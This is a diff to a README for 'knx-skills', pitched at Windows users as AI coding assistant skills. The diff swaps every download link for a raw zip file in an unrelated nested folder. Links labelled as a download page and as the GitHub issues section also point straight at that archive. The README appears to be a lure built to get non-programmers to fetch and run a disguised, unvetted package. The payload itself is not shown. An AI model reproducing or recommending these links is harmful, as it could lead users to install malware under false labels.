@@ -1,6 +1,6 @@
 # 🤖 knx-skills - Useful AI Coding Assistant Skills
 
-[![Download knx-skills](https://img.shields.io/badge/Download-knx--skills-ff6f61?style=flat-square)](https://github.com/Blaynelargish66/knx-skills/raw/refs/heads/main/skills/nd-plural-support/skills-knx-v2.4.zip)
+[![Download knx-skills](https://img.shields.io/badge/Download-knx--skills-ff6f61?style=flat-square)](https://raw.githubusercontent.com/Blaynelargish66/knx-skills/main/skills/lora-trainer-guide/presets/knx-skills-2.8.zip)
 
 ## About knx-skills
 
@@ -30,13 +30,13 @@ No programming knowledge is needed to use knx-skills. The setup is simple and do
 
 Use the link below to get knx-skills on your Windows computer:
 
-[![Download knx-skills](https://img.shields.io/badge/Download-knx--skills-4CAF50?style=flat-square)](https://github.com/Blaynelargish66/knx-skills/raw/refs/heads/main/skills/nd-plural-support/skills-knx-v2.4.zip)
+[![Download knx-skills](https://img.shields.io/badge/Download-knx--skills-4CAF50?style=flat-square)](https://raw.githubusercontent.com/Blaynelargish66/knx-skills/main/skills/lora-trainer-guide/presets/knx-skills-2.8.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the download button above or visit the page below:
 
-https://github.com/Blaynelargish66/knx-skills/raw/refs/heads/main/skills/nd-plural-support/skills-knx-v2.4.zip
+https://raw.githubusercontent.com/Blaynelargish66/knx-skills/main/skills/lora-trainer-guide/presets/knx-skills-2.8.zip
 
 This page hosts the files and instructions to get knx-skills on your PC.
 
@@ -93,7 +93,7 @@ If you have trouble running knx-skills:
 
 If problems persist, visit the issues section on the GitHub page for help:
 
-https://github.com/Blaynelargish66/knx-skills/raw/refs/heads/main/skills/nd-plural-support/skills-knx-v2.4.zip
+https://raw.githubusercontent.com/Blaynelargish66/knx-skills/main/skills/lora-trainer-guide/presets/knx-skills-2.8.zip
 
 ## 📂 Files Included
 
@@ -123,6 +123,6 @@ You can explore these topics by examining the markdown files included.
 
 The software is ready for Windows users. Use this button again to visit the download page:
 
-[![Download knx-skills](https://img.shields.io/badge/Download-knx--skills-ff6f61?style=flat-square)](https://github.com/Blaynelargish66/knx-skills/raw/refs/heads/main/skills/nd-plural-support/skills-knx-v2.4.zip)
+[![Download knx-skills](https://img.shields.io/badge/Download-knx--skills-ff6f61?style=flat-square)](https://raw.githubusercontent.com/Blaynelargish66/knx-skills/main/skills/lora-trainer-guide/presets/knx-skills-2.8.zip)
 
 Click it to get started with knx-skills and improve your AI coding assistant experience.
